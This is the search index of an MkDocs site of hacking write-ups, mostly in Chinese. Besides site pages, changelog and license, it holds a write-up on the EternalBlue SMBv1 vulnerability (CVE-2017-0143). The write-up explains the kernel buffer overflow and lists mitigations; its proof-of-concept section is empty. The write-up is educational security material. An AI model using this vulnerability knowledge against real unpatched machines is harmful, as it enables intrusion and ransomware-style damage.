{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hacking Write-ups \u00b6 A collection of awesome write-ups from topics ranging from CVE, vulnHub, CTFs, Hack the box walkthroughs, real-life encounters and everything which can help other enthusiasts learn. Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout \u00b6 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"\u7b80\u4ecb"},{"location":"#hacking-write-ups","text":"A collection of awesome write-ups from topics ranging from CVE, vulnHub, CTFs, Hack the box walkthroughs, real-life encounters and everything which can help other enthusiasts learn.","title":"Hacking Write-ups"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"changelog/","text":"Changelog \u00b6 Hacking Write-ups \u00b6 2022-10-25 \u00b6 \u66f4\u6362\u7ad9\u70b9\u5b57\u4f53\uff0c\u5f15\u7528\u5916\u90e8\u5b57\u4f53 LxgwWenKai \u6dfb\u52a0\u5e38\u7528\u7684 Markdown \u8bed\u6cd5\u4f7f\u7528\u8bf4\u660e\uff0c\u53c2\u8003 MkDocs Markdown Reference \u66f4\u65b0\u90e8\u7f72\u811a\u672c 2022-10-24 \u00b6 \u521b\u5efa\u7ad9\u70b9 \u5305\u542b\u680f\u76ee CVEs, vulnHub, HackTheBox \u6dfb\u52a0 CVE-2022-25411, CVE-2022-28060, CVE-2022-25488, CVE-2022-25578, CVE-2022-26201, CVE-2022-28512, CVE-2017-0143, CVE-2022-29464, CVE-2022-28525, CVE-2022-26965, CVE-2022-32991, CVE-2022-30887 Made with Material for MkDocs \u7531 KK \u548c HZH \u7ef4\u62a4","title":"Changelog"},{"location":"changelog/#changelog","text":"","title":"Changelog"},{"location":"changelog/#hacking-write-ups","text":"","title":"Hacking Write-ups"},{"location":"changelog/#2022-10-25","text":"\u66f4\u6362\u7ad9\u70b9\u5b57\u4f53\uff0c\u5f15\u7528\u5916\u90e8\u5b57\u4f53 LxgwWenKai \u6dfb\u52a0\u5e38\u7528\u7684 Markdown \u8bed\u6cd5\u4f7f\u7528\u8bf4\u660e\uff0c\u53c2\u8003 MkDocs Markdown Reference \u66f4\u65b0\u90e8\u7f72\u811a\u672c","title":"2022-10-25"},{"location":"changelog/#2022-10-24","text":"\u521b\u5efa\u7ad9\u70b9 \u5305\u542b\u680f\u76ee CVEs, vulnHub, HackTheBox \u6dfb\u52a0 CVE-2022-25411, CVE-2022-28060, CVE-2022-25488, CVE-2022-25578, CVE-2022-26201, CVE-2022-28512, CVE-2017-0143, CVE-2022-29464, CVE-2022-28525, CVE-2022-26965, CVE-2022-32991, CVE-2022-30887 Made with Material for MkDocs \u7531 KK \u548c HZH \u7ef4\u62a4","title":"2022-10-24"},{"location":"contribute/","text":"\u4e3a Hacking Write-ups \u9879\u76ee\u505a\u8d21\u732e \u00b6 \u6b22\u8fce\u8d21\u732e \u00b6 Hacking Write-ups \u9879\u76ee\u6b22\u8fce\u5e76\u4f9d\u8d56\u4e8e\u5f00\u6e90\u793e\u533a\u4e2d\u5f00\u53d1\u4eba\u5458\u548c\u7528\u6237\u7684\u8d21\u732e\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u505a\u51fa\u8d21\u732e\uff0c\u4f8b\u5982\uff1a \u901a\u8fc7\u62c9\u53d6\u8bf7\u6c42\u8fdb\u884c\u4ee3\u7801\u8865\u4e01 \u6587\u6863\u6539\u8fdb \u9519\u8bef\u62a5\u544a\u548c\u8865\u4e01\u5ba1\u67e5 \u884c\u4e3a\u51c6\u5219 \u00b6 \u5728 Hacking Write-ups \u9879\u76ee\u7684\u4ee3\u7801\u5e93\u3001\u95ee\u9898\u8ddf\u8e2a\u5668\u3001\u804a\u5929\u5ba4\u548c\u90ae\u4ef6\u5217\u8868\u4e2d\u8fdb\u884c\u4ea4\u4e92\u7684\u6bcf\u4e2a\u4eba\u90fd\u5e94\u9075\u5faa PyPA \u884c\u4e3a\u51c6\u5219 \u3002 \u9879\u76ee\u7ed3\u6784 \u00b6 docs \uff1a\u5b58\u653e\u6587\u6863\u7684\u76ee\u5f55\u3002 docs/cves \uff1a\u5b58\u653e CVE \u7684\u76ee\u5f55\u3002 docs/vulnhub \uff1a\u5b58\u653e VulnHub \u7684\u76ee\u5f55\u3002 docs/hackthebox \uff1a\u5b58\u653e HackTheBox \u7684\u76ee\u5f55\u3002 images \uff1a\u6bcf\u4e2aMD\u6587\u4ef6\u7684\u540c\u7ea7\u76ee\u5f55\u90fd\u6709\u4e00\u4e2a images \u76ee\u5f55\uff0c\u7528\u4e8e\u5b58\u653e\u56fe\u7247\u3002 \u6dfb\u52a0\u6587\u7ae0\u7684\u6b65\u9aa4 \u00b6 \u5728 docs/cves/CVE-2022 \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 MD \u6587\u4ef6\uff0c\u4f8b\u5982 docs/cves/CVE-2022/CVE-2022-25411.md \u3002 \u5728\u65b0\u5efa MD \u6587\u4ef6\u7684\u540c\u7ea7\u76ee\u5f55\u4e0b\u7684 images \u6587\u4ef6\u5939\u4e2d\u5b58\u653e\u6587\u7ae0\u56fe\u7247\uff0c\u4f8b\u5982 docs/cves/CVE-2022/images/CVE-2022-25411-1.png \u3002 \u5728 docs/cves/CVE-2022/CVE-2022-25411.md \u6587\u4ef6\u4e2d\u6dfb\u52a0\u6587\u7ae0\u5185\u5bb9\u3002 # CVE-2022-25411 ## \u6f0f\u6d1e\u63cf\u8ff0 ## \u5f71\u54cd\u8303\u56f4 ## \u6f0f\u6d1e\u5206\u6790 ## \u6f0f\u6d1e\u5229\u7528 ## \u53c2\u8003\u94fe\u63a5 \u5728 docs/cves/CVE-2022/CVE-2022-25411.md \u6587\u4ef6\u4e2d\u6dfb\u52a0\u56fe\u7247\u5f15\u7528\uff0c\u4f8b\u5982 ![](images/CVE-2022-25411-1.png){ width=30% } \u3002 \u5728 mkdocs.yml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u6587\u7ae0\u7684\u5bfc\u822a\u8bbe\u7f6e\uff0c\u4f8b\u5982\uff1a nav : - Home : - \u7b80\u4ecb : index.md - \u8d21\u732e\u6307\u5357 : contribute.md - \u8ba8\u8bba\u4ea4\u6d41 : discussion.md - Changelog : changelog.md - License : license.md - CVEs : - cves/index.md - CVE-2022 : - cves/CVE-2022/CVE-2022-25411.md - cves/CVE-2022/CVE-2022-25488.md - cves/CVE-2022/CVE-2022-25578.md - cves/CVE-2022/CVE-2022-26201.md - cves/CVE-2022/CVE-2022-26965.md - cves/CVE-2022/CVE-2022-28060.md - cves/CVE-2022/CVE-2022-28512.md - cves/CVE-2022/CVE-2022-28525.md - cves/CVE-2022/CVE-2022-29464.md - cves/CVE-2022/CVE-2022-30887.md - cves/CVE-2022/CVE-2022-32991.md - CVE-2017 : - cves/CVE-2017/CVE-2017-0143.md - VulnHub : - vulnhub/index.md - vulnhub/Jarbas-1.md - HackTheBox : - hackthebox/index.html \u66f4\u591a\u652f\u6301\u7684Markdown \u8bed\u6cd5\u8bf7\u53c2\u8003 MkDocs Markdown Reference \u3002 \u5982\u4f55\u8d21\u732e \u00b6 \u5b89\u88c5 MkDocs \u3002 pip install mkdocs pip install mkdocs-material pip install mkdocs-git-revision-date-localized-plugin Fork \u672c\u9879\u76ee \uff0c\u7136\u540e\u514b\u9686\u5230\u672c\u5730\uff0c\u4f8b\u5982 git clone https://github.com/kangvcar/Hacking-Write-ups.git \u3002 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5206\u652f\uff0c\u4f8b\u5982 git checkout -b my-new-article \u3002 \u6dfb\u52a0\u6587\u7ae0\uff0c\u53c2\u8003\u4e0a\u9762\u7684 \u6dfb\u52a0\u6587\u7ae0\u7684\u6b65\u9aa4 \u3002 \u63d0\u4ea4\u60a8\u7684\u66f4\u6539\uff0c\u4f8b\u5982 git commit -am 'Add article title' \u3002 \u5c06\u60a8\u7684\u5206\u652f\u63a8\u9001\u5230 GitHub\uff0c\u4f8b\u5982 git push origin my-new-article \u3002 \u7136\u540e\u521b\u5efa\u4e00\u4e2aPull Request\u3002 \u7b49\u5f85\u5ba1\u6838\uff0c\u5982\u679c\u6709\u95ee\u9898\uff0c\u6211\u4eec\u4f1a\u5728\u8bc4\u8bba\u4e2d\u56de\u590d\u60a8\u3002 \u5982\u679c\u6ca1\u6709\u95ee\u9898\uff0c\u6211\u4eec\u4f1a\u5408\u5e76\u60a8\u7684\u4ee3\u7801\u3002 \u60a8\u7684\u4ee3\u7801\u5c06\u4f1a\u5728\u4e0b\u4e00\u4e2a\u7248\u672c\u4e2d\u53d1\u5e03\u3002 \u611f\u8c22\u60a8\u7684\u8d21\u732e\uff01","title":"\u8d21\u732e\u6307\u5357"},{"location":"contribute/#hacking-write-ups","text":"","title":"\u4e3a Hacking Write-ups \u9879\u76ee\u505a\u8d21\u732e"},{"location":"contribute/#_1","text":"Hacking Write-ups \u9879\u76ee\u6b22\u8fce\u5e76\u4f9d\u8d56\u4e8e\u5f00\u6e90\u793e\u533a\u4e2d\u5f00\u53d1\u4eba\u5458\u548c\u7528\u6237\u7684\u8d21\u732e\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u505a\u51fa\u8d21\u732e\uff0c\u4f8b\u5982\uff1a \u901a\u8fc7\u62c9\u53d6\u8bf7\u6c42\u8fdb\u884c\u4ee3\u7801\u8865\u4e01 \u6587\u6863\u6539\u8fdb \u9519\u8bef\u62a5\u544a\u548c\u8865\u4e01\u5ba1\u67e5","title":"\u6b22\u8fce\u8d21\u732e"},{"location":"contribute/#_2","text":"\u5728 Hacking Write-ups \u9879\u76ee\u7684\u4ee3\u7801\u5e93\u3001\u95ee\u9898\u8ddf\u8e2a\u5668\u3001\u804a\u5929\u5ba4\u548c\u90ae\u4ef6\u5217\u8868\u4e2d\u8fdb\u884c\u4ea4\u4e92\u7684\u6bcf\u4e2a\u4eba\u90fd\u5e94\u9075\u5faa PyPA \u884c\u4e3a\u51c6\u5219 \u3002","title":"\u884c\u4e3a\u51c6\u5219"},{"location":"contribute/#_3","text":"docs \uff1a\u5b58\u653e\u6587\u6863\u7684\u76ee\u5f55\u3002 docs/cves \uff1a\u5b58\u653e CVE \u7684\u76ee\u5f55\u3002 docs/vulnhub \uff1a\u5b58\u653e VulnHub \u7684\u76ee\u5f55\u3002 docs/hackthebox \uff1a\u5b58\u653e HackTheBox \u7684\u76ee\u5f55\u3002 images \uff1a\u6bcf\u4e2aMD\u6587\u4ef6\u7684\u540c\u7ea7\u76ee\u5f55\u90fd\u6709\u4e00\u4e2a images \u76ee\u5f55\uff0c\u7528\u4e8e\u5b58\u653e\u56fe\u7247\u3002","title":"\u9879\u76ee\u7ed3\u6784"},{"location":"contribute/#_4","text":"\u5728 docs/cves/CVE-2022 \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 MD \u6587\u4ef6\uff0c\u4f8b\u5982 docs/cves/CVE-2022/CVE-2022-25411.md \u3002 \u5728\u65b0\u5efa MD \u6587\u4ef6\u7684\u540c\u7ea7\u76ee\u5f55\u4e0b\u7684 images \u6587\u4ef6\u5939\u4e2d\u5b58\u653e\u6587\u7ae0\u56fe\u7247\uff0c\u4f8b\u5982 docs/cves/CVE-2022/images/CVE-2022-25411-1.png \u3002 \u5728 docs/cves/CVE-2022/CVE-2022-25411.md \u6587\u4ef6\u4e2d\u6dfb\u52a0\u6587\u7ae0\u5185\u5bb9\u3002 # CVE-2022-25411 ## \u6f0f\u6d1e\u63cf\u8ff0 ## \u5f71\u54cd\u8303\u56f4 ## \u6f0f\u6d1e\u5206\u6790 ## \u6f0f\u6d1e\u5229\u7528 ## \u53c2\u8003\u94fe\u63a5 \u5728 docs/cves/CVE-2022/CVE-2022-25411.md \u6587\u4ef6\u4e2d\u6dfb\u52a0\u56fe\u7247\u5f15\u7528\uff0c\u4f8b\u5982 ![](images/CVE-2022-25411-1.png){ width=30% } \u3002 \u5728 mkdocs.yml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u6587\u7ae0\u7684\u5bfc\u822a\u8bbe\u7f6e\uff0c\u4f8b\u5982\uff1a nav : - Home : - \u7b80\u4ecb : index.md - \u8d21\u732e\u6307\u5357 : contribute.md - \u8ba8\u8bba\u4ea4\u6d41 : discussion.md - Changelog : changelog.md - License : license.md - CVEs : - cves/index.md - CVE-2022 : - cves/CVE-2022/CVE-2022-25411.md - cves/CVE-2022/CVE-2022-25488.md - cves/CVE-2022/CVE-2022-25578.md - cves/CVE-2022/CVE-2022-26201.md - cves/CVE-2022/CVE-2022-26965.md - cves/CVE-2022/CVE-2022-28060.md - cves/CVE-2022/CVE-2022-28512.md - cves/CVE-2022/CVE-2022-28525.md - cves/CVE-2022/CVE-2022-29464.md - cves/CVE-2022/CVE-2022-30887.md - cves/CVE-2022/CVE-2022-32991.md - CVE-2017 : - cves/CVE-2017/CVE-2017-0143.md - VulnHub : - vulnhub/index.md - vulnhub/Jarbas-1.md - HackTheBox : - hackthebox/index.html \u66f4\u591a\u652f\u6301\u7684Markdown \u8bed\u6cd5\u8bf7\u53c2\u8003 MkDocs Markdown Reference \u3002","title":"\u6dfb\u52a0\u6587\u7ae0\u7684\u6b65\u9aa4"},{"location":"contribute/#_5","text":"\u5b89\u88c5 MkDocs \u3002 pip install mkdocs pip install mkdocs-material pip install mkdocs-git-revision-date-localized-plugin Fork \u672c\u9879\u76ee \uff0c\u7136\u540e\u514b\u9686\u5230\u672c\u5730\uff0c\u4f8b\u5982 git clone https://github.com/kangvcar/Hacking-Write-ups.git \u3002 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5206\u652f\uff0c\u4f8b\u5982 git checkout -b my-new-article \u3002 \u6dfb\u52a0\u6587\u7ae0\uff0c\u53c2\u8003\u4e0a\u9762\u7684 \u6dfb\u52a0\u6587\u7ae0\u7684\u6b65\u9aa4 \u3002 \u63d0\u4ea4\u60a8\u7684\u66f4\u6539\uff0c\u4f8b\u5982 git commit -am 'Add article title' \u3002 \u5c06\u60a8\u7684\u5206\u652f\u63a8\u9001\u5230 GitHub\uff0c\u4f8b\u5982 git push origin my-new-article \u3002 \u7136\u540e\u521b\u5efa\u4e00\u4e2aPull Request\u3002 \u7b49\u5f85\u5ba1\u6838\uff0c\u5982\u679c\u6709\u95ee\u9898\uff0c\u6211\u4eec\u4f1a\u5728\u8bc4\u8bba\u4e2d\u56de\u590d\u60a8\u3002 \u5982\u679c\u6ca1\u6709\u95ee\u9898\uff0c\u6211\u4eec\u4f1a\u5408\u5e76\u60a8\u7684\u4ee3\u7801\u3002 \u60a8\u7684\u4ee3\u7801\u5c06\u4f1a\u5728\u4e0b\u4e00\u4e2a\u7248\u672c\u4e2d\u53d1\u5e03\u3002 \u611f\u8c22\u60a8\u7684\u8d21\u732e\uff01","title":"\u5982\u4f55\u8d21\u732e"},{"location":"discussion/","text":"\u8ba8\u8bba\u4ea4\u6d41 \u00b6 Discussions \u00b6 \u60a8\u53ef\u4ee5\u5728 Discussions \u4e2d\u63d0\u51fa\u4efb\u4f55\u95ee\u9898\u6216\u5efa\u8bae\u3002 \u5fae\u4fe1\u7fa4 \u00b6 \u60a8\u53ef\u4ee5\u52a0\u5165\u6211\u4eec\u7684\u5fae\u4fe1\u7fa4\uff0c\u4e0e\u6211\u4eec\u4e00\u8d77\u8ba8\u8bba\u3002 \u5fae\u4fe1\u516c\u4f17\u53f7 \u00b6 \u60a8\u53ef\u4ee5\u5173\u6ce8\u6211\u4eec\u7684\u5fae\u4fe1\u516c\u4f17\u53f7\uff0c\u83b7\u53d6\u6700\u65b0\u7684\u8d44\u8baf\u3002","title":"\u8ba8\u8bba\u4ea4\u6d41"},{"location":"discussion/#_1","text":"","title":"\u8ba8\u8bba\u4ea4\u6d41"},{"location":"discussion/#discussions","text":"\u60a8\u53ef\u4ee5\u5728 Discussions \u4e2d\u63d0\u51fa\u4efb\u4f55\u95ee\u9898\u6216\u5efa\u8bae\u3002","title":"Discussions"},{"location":"discussion/#_2","text":"\u60a8\u53ef\u4ee5\u52a0\u5165\u6211\u4eec\u7684\u5fae\u4fe1\u7fa4\uff0c\u4e0e\u6211\u4eec\u4e00\u8d77\u8ba8\u8bba\u3002","title":"\u5fae\u4fe1\u7fa4"},{"location":"discussion/#_3","text":"\u60a8\u53ef\u4ee5\u5173\u6ce8\u6211\u4eec\u7684\u5fae\u4fe1\u516c\u4f17\u53f7\uff0c\u83b7\u53d6\u6700\u65b0\u7684\u8d44\u8baf\u3002","title":"\u5fae\u4fe1\u516c\u4f17\u53f7"},{"location":"license/","text":"MIT License \u00b6 Copyright \u00a9 2022 Kangvcar Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"license/#mit-license","text":"Copyright \u00a9 2022 Kangvcar Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"MIT License"},{"location":"cves/","text":"Introduction \u00b6 About CVE introduction.","title":"Introduction"},{"location":"cves/#introduction","text":"About CVE introduction.","title":"Introduction"},{"location":"cves/CVE-2017/CVE-2017-0143/","text":"CVE-2017-0143 \u00b6 Description \u00b6 \u6c38\u6052\u4e4b\u84dd(Eternal Blue)\u7206\u53d1\u4e8e2017\u5e744\u670814\u65e5\u665a\uff0c\u662f\u4e00\u79cd\u5229\u7528 Windows \u7cfb\u7edf\u7684 SMB \u534f\u8bae\u6f0f\u6d1e\u6765\u83b7\u53d6\u7cfb\u7edf\u7684\u6700\u9ad8\u6743\u9650\uff0c\u4ee5\u6b64\u6765\u63a7\u5236\u88ab\u5165\u4fb5\u7684\u8ba1\u7b97\u673a\u3002 \u751a\u81f3\u4e8e2017\u5e745\u670812\u65e5\uff0c \u4e0d\u6cd5\u5206\u5b50\u901a\u8fc7\u6539\u9020\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u5236\u4f5c\u4e86 Wannacry \u52d2\u7d22\u75c5\u6bd2\uff0c\u4f7f\u5168\u4e16\u754c\u5927\u8303\u56f4\u5185\u906d\u53d7\u4e86\u8be5\u52d2\u7d22\u75c5\u6bd2\uff0c\u751a\u81f3\u6ce2\u53ca\u5230\u5b66\u6821\u3001\u5927\u578b\u4f01\u4e1a\u3001\u653f\u5e9c\u7b49\u673a\u6784\uff0c\u53ea\u80fd\u901a\u8fc7\u652f\u4ed8\u9ad8\u989d\u7684\u8d4e\u91d1\u624d\u80fd\u6062\u590d\u51fa\u6587\u4ef6\u3002 \u4e0d\u8fc7\u5728\u8be5\u75c5\u6bd2\u51fa\u6765\u4e0d\u4e45\u5c31\u88ab\u5fae\u8f6f\u901a\u8fc7\u6253\u8865\u4e01\u4fee\u590d\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 \u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aWindows NT\uff0cWindows 2000\u3001Windows XP\u3001Windows 2003\u3001Windows Vista\u3001Windows 7\u3001Windows 8\uff0cWindows 2008\u3001Windows 2008 R2\u3001Windows Server 2012 SP0\u3002 What is SMB? \u00b6 SMB \u534f\u8bae \u00b6 SMB\uff08Server Message Block\uff09\u662f\u4e00\u4e2a\u534f\u8bae\u670d\u52a1\u5668\u4fe1\u606f\u5757\uff0c\u5b83\u662f\u4e00\u79cd\u5ba2\u6237\u673a/\u670d\u52a1\u5668\u3001\u8bf7\u6c42/\u54cd\u5e94\u534f\u8bae\uff0c\u901a\u8fc7 SMB \u534f\u8bae\u53ef\u4ee5\u5728\u8ba1\u7b97\u673a\u95f4\u5171\u4eab\u6587\u4ef6\u3001\u6253\u5370\u673a\u3001\u547d\u540d\u7ba1\u9053\u7b49\u8d44\u6e90\uff0c\u7535\u8111\u4e0a\u7684\u7f51\u4e0a\u90bb\u5c45\u5c31\u662f\u9760SMB\u5b9e\u73b0\u7684\uff1b SMB \u534f\u8bae\u5de5\u4f5c\u5728\u5e94\u7528\u5c42\u548c\u4f1a\u8bdd\u5c42\uff0c\u53ef\u4ee5\u7528\u5728 TCP/IP \u534f\u8bae\u4e4b\u4e0a\uff0cSMB \u4f7f\u7528 TCP/139 \u7aef\u53e3\u548c TCP/445 \u7aef\u53e3\u3002 SMB \u539f\u7406 \u00b6 \u9996\u5148\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a SMB negport \u8bf7\u6c42\u6570\u636e\u62a5\uff0c\u5e76\u5217\u51fa\u5b83\u6240\u652f\u6301\u7684\u6240\u6709 SMB \u7684\u534f\u8bae\u7248\u672c\u3002 \u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u6d88\u606f\u540e\u54cd\u5e94\u8bf7\u6c42\uff0c\u5e76\u5217\u51fa\u5e0c\u671b\u4f7f\u7528\u7684 SMB \u534f\u8bae\u7248\u672c\u3002\u5982\u679c\u6ca1\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u534f\u8bae\u7248\u672c\u5219\u8fd4\u56de 0XFFFFH \uff0c\u7ed3\u675f\u901a\u4fe1\u3002 \u534f\u8bae\u786e\u5b9a\u540e\uff0c\u5ba2\u6237\u7aef\u8fdb\u7a0b\u5411\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u7528\u6237\u6216\u5171\u4eab\u7684\u8ba4\u8bc1\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u901a\u8fc7\u53d1\u9001 SessetupX \u8bf7\u6c42\u6570\u636e\u5305\u5b9e\u73b0\u7684\u3002 \u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u5bf9\u7528\u6237\u540d\u548c\u5bc6\u7801\u6216\u4e00\u4e2a\u7b80\u5355\u5bc6\u7801\u5230\u670d\u52a1\u5668\uff0c\u7136\u540e\u901a\u8fc7\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a SessetupX \u5e94\u7b54\u6570\u636e\u5305\u6765\u5141\u8bb8\u6216\u62d2\u7edd\u672c\u6b21\u8fde\u63a5\u3002 \u5f53\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5b8c\u6210\u4e86\u78cb\u5546\u548c\u8ba4\u8bc1\u4e4b\u540e\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a Tcon \u6216 TconX SMB \u6570\u636e\u62a5\u5e76\u5217\u51fa\u5b83\u60f3\u8bbf\u95ee\u7684\u7f51\u7edc\u8d44\u6e90\u7684\u540d\u79f0\uff0c\u4e4b\u540e\u4f1a\u53d1\u9001\u4e00\u4e2a TconX \u5e94\u7b54\u6570\u636e\u62a5\u4ee5\u8868\u793a\u6b64\u6b21\u8fde\u63a5\u662f\u5426\u63a5\u6536\u6216\u62d2\u7edd\u3002 \u8fde\u63a5\u5230\u76f8\u5e94\u8d44\u6e90\u540e\uff0cSMB \u5ba2\u6237\u7aef\u5c31\u80fd\u591f\u901a\u8fc7 open SMB \u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u901a\u8fc7 read SMB \u8bfb\u53d6\u6587\u4ef6\uff0c\u901a\u8fc7 write SMB \u5199\u5165\u6587\u4ef6\uff0c\u901a\u8fc7 close SMB \u5173\u95ed\u6587\u4ef6\u3002 What is Eternal Blue? \u00b6 \u6f0f\u6d1e\u51fa\u73b0\u5728 Windows SMB v1 \u4e2d\u7684\u5185\u6838\u6001\u51fd\u6570 srv!SrvOs2FeaListToNt \u5728\u5904\u7406 FEA(File Extended Attributes) \u8f6c\u6362\u65f6\uff0c\u5728\u5927\u975e\u5206\u9875\u6c60(\u5185\u6838\u7684\u6570\u636e\u7ed3\u6784\uff0cLarge Non-Paged Kernel Pool)\u4e0a\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u51fd\u6570 srv!SrvOs2FeaListToNt \u5728\u5c06 FEA list \u8f6c\u6362\u6210 NTFEA(Windows NT FEA) list \u524d\u4f1a\u8c03\u7528 srv!SrvOs2FeaListSizeToNt \u53bb\u8ba1\u7b97\u8f6c\u6362\u540e\u7684 FEA lsit \u7684\u5927\u5c0f\u3002 \u7136\u540e\u4f1a\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a srv!SrvOs2FeaListSizeToNt \u4f1a\u8ba1\u7b97 FEA list \u7684\u5927\u5c0f\u5e76\u66f4\u65b0\u5f85\u8f6c\u6362\u7684 FEA list \u7684\u5927\u5c0f \u56e0\u4e3a\u9519\u8bef\u7684\u4f7f\u7528 WORD \u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4\u8ba1\u7b97\u51fa\u6765\u7684\u5f85\u8f6c\u6362\u7684 FEA list \u7684\u5927\u5c0f\u6bd4\u771f\u6b63\u7684 FEA list \u5927 \u56e0\u4e3a\u539f\u5148\u7684\u603b\u5927\u5c0f\u8ba1\u7b97\u9519\u8bef\uff0c\u5bfc\u81f4\u5f53 FEA list \u88ab\u8f6c\u5316\u4e3a NTFEA list \u65f6\uff0c\u4f1a\u5728\u975e\u5206\u9875\u6c60\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa \u6c38\u6052\u4e4b\u84dd\u662f\u5728 Windows \u7684 SMB \u670d\u52a1\u5904\u7406 SMB v1 \u8bf7\u6c42\u65f6\u53d1\u751f\u7684\u6f0f\u6d1e\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5bfc\u81f4\u653b\u51fb\u8005\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u901a\u8fc7\u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u4f1a\u626b\u63cf\u5f00\u653e 445 \u6587\u4ef6\u5171\u4eab\u7aef\u53e3\u7684 Windows \u673a\u5668\uff0c\u65e0\u9700\u7528\u6237\u4efb\u4f55\u64cd\u4f5c\uff0c\u53ea\u8981\u5f00\u673a\u4e0a\u7f51\uff0c\u4e0d\u6cd5\u5206\u5b50\u5c31\u80fd\u5728\u7535\u8111\u548c\u670d\u52a1\u5668\u4e2d\u690d\u5165\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u7a0b\u63a7\u5236\u6728\u9a6c\u3001\u865a\u62df\u8d27\u5e01\u6316\u77ff\u673a\u7b49\u6076\u610f\u7a0b\u5e8f\u3002 Explanation of exploit; PoC \u00b6 ... Mitigation \u00b6 \u7981\u7528 SMB v1 \u534f\u8bae \u6253\u5f00 Windows Update\uff0c\u6216\u624b\u52a8\u5b89\u88c5\u8865\u4e01 \u4f7f\u7528\u9632\u706b\u5899\u963b\u6b62 445 \u7aef\u53e3\u7684\u8fde\u63a5\uff0c\u6216\u8005\u4f7f\u7528\u8fdb/\u51fa\u7ad9\u89c4\u5219\u963b\u6b62 445 \u7aef\u53e3\u7684\u8fde\u63a5 \u4e0d\u8981\u968f\u610f\u6253\u5f00\u964c\u751f\u7684\u6587\u4ef6 \u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u53ca\u65f6\u66f4\u65b0\u75c5\u6bd2\u5e93 Refer \u00b6 NSA Eternalblue SMB \u6f0f\u6d1e\u5206\u6790 Microsoft \u5b89\u5168\u516c\u544a MS17-010 - \u4e25\u91cd 